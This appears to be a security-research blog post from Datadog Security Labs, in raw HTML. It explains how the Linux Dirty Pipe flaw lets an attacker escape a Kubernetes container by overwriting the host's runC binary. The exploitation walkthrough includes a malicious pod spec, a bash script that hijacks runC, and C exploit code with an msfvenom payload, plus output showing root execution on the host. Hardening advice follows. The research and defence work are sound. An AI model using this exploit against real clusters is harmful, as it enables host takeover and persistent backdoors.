<path d="M33.3304 20.0001C33.3318 19.4272 33.1645 18.8666 32.8493 18.3882C32.5341 17.9099 32.085 17.5349 31.558 17.3103C31.031 17.0856 30.4495 17.0211 29.8861 17.1249C29.3227 17.2287 28.8024 17.4961 28.39 17.8938C26.3985 16.4569 23.651 15.5278 20.5899 15.4202L21.9192 9.16929L26.2604 10.0914C26.2837 10.5985 26.4911 11.0797 26.8438 11.4447C27.1966 11.8098 27.6703 12.0336 28.1764 12.0743C28.6824 12.115 29.1858 11.9697 29.5923 11.6656C29.9988 11.3616 30.2805 10.9197 30.3844 10.4228C30.4883 9.92592 30.4075 9.40819 30.1569 8.96669C29.9064 8.52519 29.5034 8.19025 29.0235 8.02468C28.5436 7.85911 28.0199 7.87427 27.5504 8.06733C27.0809 8.26039 26.6979 8.61809 26.4734 9.07334L21.6267 8.04128C21.4914 8.01286 21.3503 8.03928 21.2345 8.11475C21.1186 8.19022 21.0375 8.30856 21.0088 8.44381L19.5251 15.4178C16.4195 15.5044 13.6299 16.4358 11.6103 17.8892C11.3036 17.5961 10.9366 17.3735 10.5349 17.2369C10.1332 17.1004 9.70661 17.0533 9.28482 17.0987C8.86303 17.1442 8.45627 17.2813 8.09295 17.5003C7.72963 17.7193 7.41853 18.0151 7.18137 18.3668C6.94422 18.7186 6.78674 19.1179 6.71994 19.5368C6.65314 19.9557 6.67863 20.3842 6.79463 20.7923C6.91063 21.2003 7.11434 21.5782 7.39153 21.8993C7.66871 22.2205 8.01268 22.4772 8.39941 22.6516C8.35065 22.9425 8.32406 23.2367 8.31984 23.5316C8.31984 28.0202 13.5433 31.657 19.9885 31.657C26.4336 31.657 31.6547 28.0202 31.6547 23.5316C31.6545 23.2385 31.6318 22.9459 31.5869 22.6563C32.1032 22.4296 32.5427 22.058 32.8522 21.5865C33.1616 21.1151 33.3277 20.564 33.3304 20.0001ZM13.3327 22.0829C13.3322 21.6704 13.4542 21.267 13.683 20.9238C13.9118 20.5806 14.2373 20.313 14.6183 20.1548C14.9993 19.9966 15.4186 19.955 15.8233 20.0352C16.2279 20.1154 16.5997 20.3138 16.8915 20.6053C17.1834 20.8968 17.3822 21.2684 17.4628 21.6729C17.5435 22.0775 17.5023 22.4969 17.3446 22.878C17.1868 23.2592 16.9196 23.585 16.5766 23.8142C16.2337 24.0434 15.8304 24.1658 15.4179 24.1658C14.8655 24.1652 14.3358 23.9456 13.945 23.5552C13.5541 23.1648 13.3339 22.6354 13.3327 22.0829ZM24.9498 27.5896C23.5293 29.0078 20.8029 29.1201 20.0025 29.1201C19.2021 29.1201 16.4757 29.0078 15.0552 27.5896C14.9537 27.4881 14.8967 27.3505 14.8967 27.207C14.8967 27.0635 14.9537 26.9258 15.0552 26.8243C15.1566 26.7229 15.2943 26.6658 15.4378 26.6658C15.5813 26.6658 15.7189 26.7229 15.8204 26.8243C16.7168 27.7207 18.6288 28.0389 20.0025 28.0389C21.3762 28.0389 23.2906 27.7207 24.1869 26.8243C24.2365 26.7714 24.2963 26.7291 24.3626 26.6998C24.4289 26.6704 24.5005 26.6548 24.573 26.6537C24.6455 26.6526 24.7175 26.666 24.7847 26.6933C24.8518 26.7206 24.9128 26.7612 24.964 26.8125C25.0152 26.8639 25.0556 26.925 25.0827 26.9923C25.1098 27.0595 25.123 27.1316 25.1217 27.2041C25.1204 27.2766 25.1045 27.3481 25.075 27.4143C25.0454 27.4805 25.0029 27.5402 24.9498 27.5896ZM24.5848 24.1681C24.1722 24.1686 23.7687 24.0466 23.4254 23.8177C23.0821 23.5887 22.8145 23.2631 22.6564 22.882C22.4983 22.5009 22.4568 22.0814 22.5372 21.6767C22.6176 21.272 22.8162 20.9002 23.108 20.6085C23.3997 20.3167 23.7715 20.1181 24.1762 20.0377C24.5809 19.9573 25.0004 19.9988 25.3815 20.1569C25.7626 20.315 26.0882 20.5827 26.3172 20.9259C26.5461 21.2692 26.6681 21.6727 26.6676 22.0853C26.6664 22.6373 26.4465 23.1664 26.0562 23.5567C25.6658 23.947 25.1368 24.1669 24.5848 24.1681Z" fill="white"></path>
</svg>

          <span class="sr-only">reddit</span>
        </a>
      </li>
    
  </ul>
</div>
  </div>
</header>

  
    
    


    



<figure>
    <img srcset="https://datadog-securitylabs.imgix.net/img/emergingvuln_hero_explode.png?auto=format&amp;h=712&amp;dpr=1 1x,
                    https://datadog-securitylabs.imgix.net/img/emergingvuln_hero_explode.png?auto=format&amp;h=712&amp;dpr=2&amp;q=50 2x,
                    https://datadog-securitylabs.imgix.net/img/emergingvuln_hero_explode.png?auto=format&amp;h=712&amp;dpr=3&amp;q=40 3x" src="./Escaping containers using the Dirty Pipe vulnerability _ Datadog Security Labs_files/emergingvuln_hero_explode.png" alt="Escaping Containers Using The Dirty Pipe Vulnerability" class="mx-auto max-h-[712px]">
</figure>


  



    <main>
      
<div class="container py-8 tablet:py-12 desktop:py-15">
  <article class="grid grid-cols-12">
    <aside class="article-toc hidden desktop:block desktop:col-span-3">
      

<nav class="article-toc-nav text-20 leading-28 text-gray-50">
  
    <div class="flex items-center mb-4">
      <span class="inline-block mr-2"><svg class="w-[18px] h-[18px] fill-black" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 192 192" width="192" height="192">
  <path d="M176,160H68V144H176Zm0-72H68v16H176Zm0-56H68V48H176ZM44,26H16V54H44Zm0,56H16v28H44Zm0,56H16v28H44Z"></path>
</svg>
</span><p class="font-roboto-mono font-light uppercase text-sm">on this page</p><p>
    </p></div>
    <nav class="article-toc-nav">
        <ul><li><a href="https://securitylabs.datadoghq.com/articles/dirty-pipe-container-escape-poc/#a-primer-on-container-runtimes-and-the-oci-specification" class="">A Primer on container runtimes and the OCI specification</a></li><li><a href="https://securitylabs.datadoghq.com/articles/dirty-pipe-container-escape-poc/#breaking-out-from-containers" class="">Breaking out from containers</a></li><li><a href="https://securitylabs.datadoghq.com/articles/dirty-pipe-container-escape-poc/#old-habits-die-hard" class="">Old habits die hard</a></li><li><a href="https://securitylabs.datadoghq.com/articles/dirty-pipe-container-escape-poc/#exploitation-walkthrough" class="">Exploitation walkthrough</a></li><li><a href="https://securitylabs.datadoghq.com/articles/dirty-pipe-container-escape-poc/#discussion" class="">Discussion</a></li><li><a href="https://securitylabs.datadoghq.com/articles/dirty-pipe-container-escape-poc/#defense-in-depth" class="">Defense in depth</a><ul><li><a href="https://securitylabs.datadoghq.com/articles/dirty-pipe-container-escape-poc/#ensure-containerized-workloads-dont-run-as-root" class="">Ensure containerized workloads don't run as root</a></li><li><a href="https://securitylabs.datadoghq.com/articles/dirty-pipe-container-escape-poc/#ensure-only-images-from-trusted-registries-can-run-in-your-cluster" class="">Ensure only images from trusted registries can run in your cluster</a></li><li><a href="https://securitylabs.datadoghq.com/articles/dirty-pipe-container-escape-poc/#leverage-apparmor-or-selinux-to-prevent-potential-privilege-escalation-vectors" class="">Leverage AppArmor or SELinux to prevent potential privilege escalation vectors</a></li></ul></li><li><a href="https://securitylabs.datadoghq.com/articles/dirty-pipe-container-escape-poc/#how-datadog-can-help" class="">How Datadog Can Help</a></li><li><a href="https://securitylabs.datadoghq.com/articles/dirty-pipe-container-escape-poc/#conclusion" class="">Conclusion</a></li></ul>
      </nav>
  
</nav>

    </aside>

    <div class="col-span-12 desktop:col-span-8 desktop:col-start-5">
      <div class="authors grid grid-cols-2 tablet-lg:gap-x-[30px] gap-x-[14px] tablet-lg:gap-y-4 mobile:gap-y-3 gap-y-2">
        
          


    


<aside class="author-card flex flex-row w-full">
  
    


    



<figure>
    <img src="./Escaping containers using the Dirty Pipe vulnerability _ Datadog Security Labs_files/eric_mountain.jpeg" alt="Eric Mountain" class="rounded-full w-12 h-12 max-w-max max-h-max">
</figure>


  <div class="ml-2 tablet:ml-4">
    <p class="text-12 leading-16 tablet:text-14 tablet:leading-18 desktop:text-16 desktop:leading-20 font-extrabold ">Eric Mountain</p>
    <p class="mt-1 text-12 leading-16 tablet:text-14 tablet:leading-18 desktop:text-16 desktop:leading-20">Senior Software Engineer</p>
  </div>
</aside>

        
          


    


<aside class="author-card flex flex-row w-full">
  
    


    



<figure>
    <img src="./Escaping containers using the Dirty Pipe vulnerability _ Datadog Security Labs_files/tafani-dereeper_christophe2.jpeg" alt="Christophe Tafani-Dereeper" class="rounded-full w-12 h-12 max-w-max max-h-max">
</figure>


  <div class="ml-2 tablet:ml-4">
    <p class="text-12 leading-16 tablet:text-14 tablet:leading-18 desktop:text-16 desktop:leading-20 font-extrabold ">Christophe Tafani-Dereeper</p>
    <p class="mt-1 text-12 leading-16 tablet:text-14 tablet:leading-18 desktop:text-16 desktop:leading-20">Cloud Security Researcher and Advocate</p>
  </div>
</aside>

        
          


    


<aside class="author-card flex flex-row w-full">
  
    


    



<figure>
    <img src="./Escaping containers using the Dirty Pipe vulnerability _ Datadog Security Labs_files/tommy_mccormick.jpeg" alt="Tommy McCormick" class="rounded-full w-12 h-12 max-w-max max-h-max">
</figure>


  <div class="ml-2 tablet:ml-4">
    <p class="text-12 leading-16 tablet:text-14 tablet:leading-18 desktop:text-16 desktop:leading-20 font-extrabold ">Tommy McCormick</p>
    <p class="mt-1 text-12 leading-16 tablet:text-14 tablet:leading-18 desktop:text-16 desktop:leading-20">Security Engineer</p>
  </div>
</aside>

        
          


    


<aside class="author-card flex flex-row w-full">
  
    


    



<figure>
    <img src="./Escaping containers using the Dirty Pipe vulnerability _ Datadog Security Labs_files/frederic_baguelin.jpeg" alt="Frederic Baguelin" class="rounded-full w-12 h-12 max-w-max max-h-max">
</figure>


  <div class="ml-2 tablet:ml-4">
    <p class="text-12 leading-16 tablet:text-14 tablet:leading-18 desktop:text-16 desktop:leading-20 font-extrabold ">Frederic Baguelin</p>
    <p class="mt-1 text-12 leading-16 tablet:text-14 tablet:leading-18 desktop:text-16 desktop:leading-20">Security Researcher</p>
  </div>
</aside>

        
      </div>

      <div class="article-content relative">
        <span class="block pb-[30px] tablet:pb-8 desktop:pb-12"></span>
        <p>The <a href="https://securitylabs.datadoghq.com/articles/dirty-pipe-vulnerability-overview-and-remediation/">Dirty Pipe vulnerability</a> is a flaw in the Linux kernel that allows an unprivileged process to write to any file it can read, even if it does not have write permissions on this file. This primitive allows for privilege escalation, for instance by overwriting the <strong>/etc/passwd</strong> file with a new admin user.</p>
<figure class="mt-4">
        <img class="w-full mx-auto" srcset="https://datadog-securitylabs.imgix.net/img/dirty-pipe-container-escape-poc/dirty-pipe-exploit-test-rev.png?auto=format&amp;w=896&amp;dpr=1 1x, https://datadog-securitylabs.imgix.net/img/dirty-pipe-container-escape-poc/dirty-pipe-exploit-test-rev.png?auto=format&amp;w=896&amp;dpr=2&amp;q=50 2x, https://datadog-securitylabs.imgix.net/img/dirty-pipe-container-escape-poc/dirty-pipe-exploit-test-rev.png?auto=format&amp;w=896&amp;dpr=3&amp;q=40 3x" src="./Escaping containers using the Dirty Pipe vulnerability _ Datadog Security Labs_files/dirty-pipe-exploit-test-rev.png" alt="Exploiting Dirty Pipe to add a privileged user to the system by writing to the /etc/passwd file" loading="lazy">
        <figcaption class="text-gray-500 mt-4 mx-auto w-max max-w-full">Exploiting Dirty Pipe to add a privileged user to the system by writing to the /etc/passwd file</figcaption>
      </figure>
<p>This vulnerability could be used for breaking out from unprivileged containers, including in Kubernetes environments. In this post, we will present a proof-of-concept exploit allowing an attacker having compromised such a container to escape to the underlying host and gain host-level administrative privileges.</p>
<h2 id="a-primer-on-container-runtimes-and-the-oci-specification" tabindex="-1"><a class="header-anchor" href="https://securitylabs.datadoghq.com/articles/dirty-pipe-container-escape-poc/#a-primer-on-container-runtimes-and-the-oci-specification">A Primer on container runtimes and the OCI specification</a></h2>
<p>Kubernetes supports container runtimes that implement the Kubernetes Container Runtime Interface (CRI) specification, such as containerd or CRI-O. Container runtimes are responsible for pulling images from registries, managing them on the host, and creating lower-level Linux processes that are properly segmented from each other.</p>
<figure class="mt-4">
        <img class="w-full mx-auto" srcset="https://datadog-securitylabs.imgix.net/img/dirty-pipe-container-escape-poc/dirty-pipe-cri-interface.png?auto=format&amp;w=896&amp;dpr=1 1x, https://datadog-securitylabs.imgix.net/img/dirty-pipe-container-escape-poc/dirty-pipe-cri-interface.png?auto=format&amp;w=896&amp;dpr=2&amp;q=50 2x, https://datadog-securitylabs.imgix.net/img/dirty-pipe-container-escape-poc/dirty-pipe-cri-interface.png?auto=format&amp;w=896&amp;dpr=3&amp;q=40 3x" src="./Escaping containers using the Dirty Pipe vulnerability _ Datadog Security Labs_files/dirty-pipe-cri-interface.png" alt="diagram of kubelet communicating with runtime via CRI interface" loading="lazy">
        <figcaption class="text-gray-500 mt-4 mx-auto w-max max-w-full">diagram of kubelet communicating with runtime via CRI interface</figcaption>
      </figure>
<p>Creating low-level containerized Linux processes is a somewhat complex task that requires setting up control groups and kernel namespaces to ensure the process runs in a logical container and cannot, for instance, access the file system of other containerized processes. In reality, container runtimes don't create low-level processes themselves. Instead, they invoke a lower-level runtime that implements the <a href="https://github.com/opencontainers/runtime-spec/blob/main/config-linux.md">Open Container Interface (OCI) runtime specification</a>, the most common of which is <a href="https://github.com/opencontainers/runc">runC</a>.</p>
<figure class="mt-4">
        <img class="w-full mx-auto" srcset="https://datadog-securitylabs.imgix.net/img/dirty-pipe-container-escape-poc/dirty-pipe-cri-runc.png?auto=format&amp;w=896&amp;dpr=1 1x, https://datadog-securitylabs.imgix.net/img/dirty-pipe-container-escape-poc/dirty-pipe-cri-runc.png?auto=format&amp;w=896&amp;dpr=2&amp;q=50 2x, https://datadog-securitylabs.imgix.net/img/dirty-pipe-container-escape-poc/dirty-pipe-cri-runc.png?auto=format&amp;w=896&amp;dpr=3&amp;q=40 3x" src="./Escaping containers using the Dirty Pipe vulnerability _ Datadog Security Labs_files/dirty-pipe-cri-runc.png" alt="diagram of container runtime invoking runC" loading="lazy">
        <figcaption class="text-gray-500 mt-4 mx-auto w-max max-w-full">diagram of container runtime invoking runC</figcaption>
      </figure>
<h2 id="breaking-out-from-containers" tabindex="-1"><a class="header-anchor" href="https://securitylabs.datadoghq.com/articles/dirty-pipe-container-escape-poc/#breaking-out-from-containers">Breaking out from containers</a></h2>
<p>When runC creates a containerized process, it proceeds as follows:</p>
<ol>
<li>Fork itself to create a child process</li>
<li><a href="https://github.com/opencontainers/runc/blob/dd023c457d84de44fa61e6ff0e0cf6a0edd1005e//libcontainer/standard_init_linux.go#L76-L205">Set up</a> the containerized environment (kernel namespace, control groups, etc.)</li>
<li>Redirect the execution flow to the user-supplied entrypoint through the <a href="https://github.com/opencontainers/runc/blob/dd023c457d84de44fa61e6ff0e0cf6a0edd1005e//libcontainer/standard_init_linux.go#L206"><code>execve</code></a> system call</li>
</ol>
<p>Over the years, several vulnerabilities have been discovered in runC that allow a malicious process to break out from an unprivileged container. In particular, <a href="https://unit42.paloaltonetworks.com/breaking-docker-via-runc-explaining-cve-2019-5736/">CVE-2019-5736</a> is a well-known vulnerability in which a malicious container entrypoint could overwrite the runC binary on the host, hence gaining root privileges.</p>
<p>This vulnerability takes advantage of the fact that, when <code>execve</code> is called to execute the user-supplied entrypoint, the file at <strong>/proc/self/exe</strong>—available inside the container—is associated with an open file descriptor for the runC binary on the host. Consequently, a malicious process inside the container could write to this file descriptor, overwrite the runC binary on the host, and escape from the container. See <a href="https://github.com/twistlock/RunC-CVE-2019-5736">here</a> for a proof of concept by Yuval Avrahami.</p>
<p>To remediate the <a href="https://unit42.paloaltonetworks.com/breaking-docker-via-runc-explaining-cve-2019-5736/">CVE-2019-5736</a> vulnerability, the runC team implemented <a href="https://github.com/opencontainers/runc/commit/0a8e4117e7f715d5fbeef398405813ce8e88558b">a patch</a> that clones the runC binary before executing it, to ensure it could not be overwritten from inside a container. About a month later, the runC team <a href="https://github.com/opencontainers/runc/commit/16612d74de5f84977e50a9c8ead7f0e9e13b8628">changed this behavior again</a> to take advantage of kernel cache page sharing by mounting the runC binary inside the container read only. We'll see in the next section how this performance improvement makes Dirty Pipe exploitable for container escape.</p>
<h2 id="old-habits-die-hard" tabindex="-1"><a class="header-anchor" href="https://securitylabs.datadoghq.com/articles/dirty-pipe-container-escape-poc/#old-habits-die-hard">Old habits die hard</a></h2>
<p>Thanks to the exploitation primitive the Dirty Pipe vulnerability provides us—that is, the ability to overwrite any file we can read—we have the ability to overwrite the runC binary on the host. This overwrite is not persistent and happens in the kernel page cache, so the original runC binary is left untouched on persistent storage and can be recovered by dropping caches or rebooting the machine. Regardless, it allows us to escape the container.</p>
<p>Our PoC exploit is similar to the exploitation of <a href="https://unit42.paloaltonetworks.com/breaking-docker-via-runc-explaining-cve-2019-5736/">CVE-2019-5736</a>. It runs inside an unprivileged container and works as follows:</p>
<ol>
<li>Waits for runC to be executed inside the container. This happens, for instance, when an administrator performs a <code>kubectl exec</code> operation on the container.</li>
<li>As soon as runC runs inside the container, the exploit uses the Dirty Pipe exploit to overwrite the cloned binary with a malicious executable, through its file descriptor available at <strong>/proc/&lt;runC-pid&gt;/exe</strong>, and referencing the runC binary on the host.</li>
</ol>
<h2 id="exploitation-walkthrough" tabindex="-1"><a class="header-anchor" href="https://securitylabs.datadoghq.com/articles/dirty-pipe-container-escape-poc/#exploitation-walkthrough">Exploitation walkthrough</a></h2>
<p>Our full container breakout exploit code (derived from the original proof of concept of Max Kellermann) is available <a href="https://github.com/DataDog/dirtypipe-container-breakout-poc">on GitHub</a>.</p>
<p>First, we start by running an unprivileged pod that is modeled on a pod that gets compromised by an attacker, for instance through a standard web application vulnerability. The pod specification doesn't have anything special, so the same exploitation steps can be taken by an attacker tricking a system administrator or deployment system into deploying an attacker-controlled malicious container image.</p>
<pre class="language-bash"><code class="language-bash">$ <span class="token function">cat</span> pod.yaml
apiVersion: v1
kind: Pod
metadata:
  name: compromised-pod
spec:
  containers:
  - name: compromised-container
	image: ghcr.io/datadog/dirtypipe-container-breakout
	imagePullPolicy: Always
	command: <span class="token punctuation">[</span><span class="token string">"sh"</span>, <span class="token string">"/wait-for-runc-and-overwrite.sh"</span><span class="token punctuation">]</span>

$ kubectl apply <span class="token parameter variable">-f</span> pod.yaml
</code><button class="btn-codeblock" data-custom-name="Codeblock copy button">copy</button></pre>
<p>The entrypoint of the container in this pod is a bash script waiting for a runC process to run inside the container. It then uses the Dirty Pipe exploit to overwrite the runC binary on the host with a malicious ELF binary:</p>
<pre class="language-bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span>

<span class="token comment"># Inspired from https://unit42.paloaltonetworks.com/breaking-docker-via-runC-explaining-cve-2019-5736/ </span>

<span class="token comment"># When /bin/sh is executed through kubectl exec, runC will be executed so our script can overwrite it</span>
<span class="token builtin class-name">echo</span> <span class="token string">'#!/proc/self/exe'</span> <span class="token operator">&gt;</span> /bin/sh

<span class="token builtin class-name">echo</span> <span class="token string">"Waiting for runC to be executed in the container"</span>

<span class="token keyword">while</span> <span class="token boolean">true</span> <span class="token punctuation">;</span> <span class="token keyword">do</span>
  <span class="token assign-left variable">runC_pid</span><span class="token operator">=</span><span class="token string">""</span>

  <span class="token keyword">while</span> <span class="token punctuation">[</span> <span class="token parameter variable">-z</span> <span class="token string">"<span class="token variable">$runC_pid</span>"</span> <span class="token punctuation">]</span> <span class="token punctuation">;</span> <span class="token keyword">do</span>
	<span class="token assign-left variable">runC_pid</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token function">ps</span> axf <span class="token operator">|</span> <span class="token function">grep</span> /proc/self/exe <span class="token operator">|</span> <span class="token function">grep</span> <span class="token parameter variable">-v</span> <span class="token function">grep</span> <span class="token operator">|</span> <span class="token function">awk</span> <span class="token string">'{print $1}'</span><span class="token variable">)</span></span>
  <span class="token keyword">done</span>

  /exploit /proc/<span class="token variable">${runC_pid}</span>/exe
<span class="token keyword">done</span></code><button class="btn-codeblock" data-custom-name="Codeblock copy button">copy</button></pre>
<p>We modified the original Dirty Pipe proof of concept to overwrite the target binary with a malicious one that runs the commands <code>id</code> and <code>hostname</code>, writing their output to <strong>/tmp/hacked</strong>.</p>
<pre class="language-c"><code class="language-c">
<span class="token comment">// original Dirty Pipe PoC from dirtypipe.cm4all.com</span>
<span class="token comment">// and adaptation from https://haxx.in/files/dirtypipez.c</span>

<span class="token comment">// Generated using msfvenom -a x86 -p linux/x86/exec CMD="id &gt; /tmp/hacked &amp;&amp; hostname &gt;&gt; /tmp/hacked" -f elf</span>
<span class="token comment">// Note: The first ELF byte is removed, since the Dirty Pipe exploit cannot write on the first byte of a memory page</span>
<span class="token keyword">const</span> <span class="token keyword">unsigned</span> <span class="token keyword">char</span> malicious_elf_bytes<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span>
    <span class="token comment">/*0x7f,*/</span> <span class="token number">0x45</span><span class="token punctuation">,</span><span class="token number">0x4c</span><span class="token punctuation">,</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>argc <span class="token operator">!=</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
   	 <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Usage: %s /proc/&lt;runc_pid&gt;/exe\n"</span><span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
   	 <span class="token keyword">return</span> EXIT_FAILURE<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">char</span> <span class="token operator">*</span>path <span class="token operator">=</span> argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> <span class="token class-name">size_t</span> data_size <span class="token operator">=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>malicious_elf_bytes<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] hijacking runc..\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">hax</span><span class="token punctuation">(</span>path<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> malicious_elf_bytes<span class="token punctuation">,</span> data_size<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
   	 <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[~] failed\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
   	 <span class="token keyword">return</span> EXIT_FAILURE<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] Successfully overwrote runC with our malicious binary!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">return</span> EXIT_SUCCESS<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code><button class="btn-codeblock" data-custom-name="Codeblock copy button">copy</button></pre>
<p>The pre-requisite for the exploit to be successful is that a legitimate user runs a <code>kubectl exec</code> command in the container, causing runC to be executed in the same PID namespace as our malicious bash script.</p>
<pre class="language-bash"><code class="language-bash">$ kubectl <span class="token builtin class-name">exec</span> <span class="token parameter variable">-it</span> compromised-pod -- <span class="token function">sh</span></code><button class="btn-codeblock" data-custom-name="Codeblock copy button">copy</button></pre>
<p>In the output of our malicious shell script, we then see:</p>
<pre class="language-bash"><code class="language-bash">Waiting <span class="token keyword">for</span> runC to be executed <span class="token keyword">in</span> the container
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Hijacking runC<span class="token punctuation">..</span>.
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Successfully overwrote runC with our malicious binary<span class="token operator">!</span></code><button class="btn-codeblock" data-custom-name="Codeblock copy button">copy</button></pre>
<p>If we connect to the worker node, we notice the runC binary has indeed been overwritten with our malicious executable!</p>
<pre class="language-bash"><code class="language-bash"><span class="token comment"># Before exploitation</span>
root@pool-stbjbwsjv-cn15e:/<span class="token comment"># md5sum /usr/bin/runc</span>
4139ffa81a373778877c5987ac476a19  /usr/bin/runc

<span class="token comment"># After exploitation</span>
root@pool-stbjbwsjv-cn15e:/<span class="token comment"># md5sum /usr/bin/runc</span>
721e312c0f3208913eaa6f3762b2d0cb  /usr/bin/runc</code><button class="btn-codeblock" data-custom-name="Codeblock copy button">copy</button></pre>
<p>Still on the worker node, we notice our malicious commands have indeed been run as root, as the file <strong>/tmp/hacked</strong> can testify:</p>
<pre class="language-bash"><code class="language-bash"><span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span>
pool-stbjbwsjv-cn15e</code><button class="btn-codeblock" data-custom-name="Codeblock copy button">copy</button></pre>
<p>While we used a benign payload for the sake of illustration, one can build a stealthier backdoor that executes malicious commands before invoking runC, making exploitation much harder to notice, or establishing persistence on the underlying host.</p>
<h2 id="discussion" tabindex="-1"><a class="header-anchor" href="https://securitylabs.datadoghq.com/articles/dirty-pipe-container-escape-poc/#discussion">Discussion</a></h2>
<p>The <a href="https://github.com/opencontainers/runc/commit/0a8e4117e7f715d5fbeef398405813ce8e88558b">initial patch</a> for CVE-2019-5736 would have prevented this type exploitation since we'd have only managed to overwrite a <em>copy</em> of runC. However, the <a href="https://github.com/opencontainers/runc/commit/16612d74de5f84977e50a9c8ead7f0e9e13b8628">follow-up commit</a>, which takes advantage of the kernel page cache and configures runC to bind-mount its binary as read only in the container, makes it possible to use the Dirty Pipe vulnerability.</p>
<p>We can confirm that clearing the kernel page cache "reverts" our overwrite of the runC binary.</p>
<pre class="language-bash"><code class="language-bash">$ md5sum /usr/bin/runc
721e312c0f3208913eaa6f3762b2d0cb  /usr/bin/runc

$ <span class="token builtin class-name">echo</span> <span class="token number">3</span> <span class="token operator">&gt;</span> /proc/sys/vm/drop_caches

$ md5sum /usr/bin/runc
4139ffa81a373778877c5987ac476a19  /usr/bin/runc</code><button class="btn-codeblock" data-custom-name="Codeblock copy button">copy</button></pre>
<p>Similarly, running the exploit against a custom version of runC that <a href="https://github.com/opencontainers/runc/blob/v1.1.0/libcontainer/nsenter/cloned_binary.c#L492-L494">disables the read-only mount</a> of the runC binary inside the container neutralizes the exploit.</p>
<h2 id="defense-in-depth" tabindex="-1"><a class="header-anchor" href="https://securitylabs.datadoghq.com/articles/dirty-pipe-container-escape-poc/#defense-in-depth">Defense in depth</a></h2>
<p>Following the defense-in-depth mindset, it's relevant to ask ourselves how the container breakout could have been prevented even if our cluster was vulnerable to Dirty Pipe. In this section, we'll discuss a few additional layers of security that would have prevented (or at least made more difficult) a container breakout using Dirty Pipe.</p>
<h3 id="ensure-containerized-workloads-dont-run-as-root" tabindex="-1"><a class="header-anchor" href="https://securitylabs.datadoghq.com/articles/dirty-pipe-container-escape-poc/#ensure-containerized-workloads-dont-run-as-root">Ensure containerized workloads don't run as root</a></h3>
<p>Container workloads should not run as root. Under normal conditions being root inside a container doesn't immediately allow to escape, but it often makes it easier to break out when combined with a vulnerability such as Dirty Pipe.</p>
<p>Here are some recommendations to gain assurance that containerized Kubernetes workloads don't run as root inside containers.</p>
<ul>
<li>Set <code>runAsUser</code> and <code>runAsGroup</code> to non-zero values to run workloads as unprivileged users instead of root.</li>
<li>Set <code>runAsNonRoot</code> to <code>true</code> to have the kubelet ensure that no process is running as root inside the container. For instance, it will prevent a container with a <code>runAsUser</code> set to 0 or that is unset from being executed.</li>
<li>Set <code>allowPrivilegeEscalation</code> to <code>false</code> to ensure that common privilege escalation vectors based on SUID binaries cannot be used (this includes vulnerabilities in <a href="https://www.datadoghq.com/blog/pwnkit-vulnerability-overview-and-remediation/">PwnKit</a> or <a href="https://blog.qualys.com/vulnerabilities-threat-research/2021/01/26/cve-2021-3156-heap-based-buffer-overflow-in-sudo-baron-samedit">sudo</a>).</li>
<li>When possible, set <code>readonlyRootFilesystem</code> to <code>true</code>. This makes the file system of your container read-only, preventing some privilege escalation exploits from running properly.</li>
</ul>
<p>These hardening practices can be enforced at runtime through Pod Security Admission (Kubernetes v1.23+), which replaces the now-deprecated <a href="https://kubernetes.io/docs/concepts/security/pod-security-admission/">Pod Security Policies</a>, or by using an add-on admission controller such as <a href="https://kyverno.io/">Kyverno</a> or <a href="https://github.com/open-policy-agent/gatekeeper">OPA Gatekeeper</a>.</p>
<h3 id="ensure-only-images-from-trusted-registries-can-run-in-your-cluster" tabindex="-1"><a class="header-anchor" href="https://securitylabs.datadoghq.com/articles/dirty-pipe-container-escape-poc/#ensure-only-images-from-trusted-registries-can-run-in-your-cluster">Ensure only images from trusted registries can run in your cluster</a></h3>
<p>As discussed earlier, the Dirty Pipe vulnerability can be leveraged for full host compromise if an attacker manages to deploy a malicious image in your cluster.</p>
